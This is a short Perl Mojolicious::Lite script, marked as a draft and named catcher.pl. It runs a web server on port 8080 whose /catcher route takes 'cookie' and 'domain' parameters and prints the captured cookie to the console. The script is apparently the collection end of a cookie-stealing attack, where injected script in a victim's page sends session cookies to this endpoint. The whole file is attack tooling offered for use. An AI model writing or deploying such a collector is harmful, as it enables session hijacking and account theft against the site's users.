#!/usr/bin/env perl

# draft code
# perl catcher.pl daemon -m production -l http://*:8080

use 5.010;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/catcher" => sub ($catcher) {
	my $cookie = $catcher -> param("cookie");
	my $domain = $catcher -> param("domain");

	print "[ + ] - Your cookie is $cookie";
};

app -> start();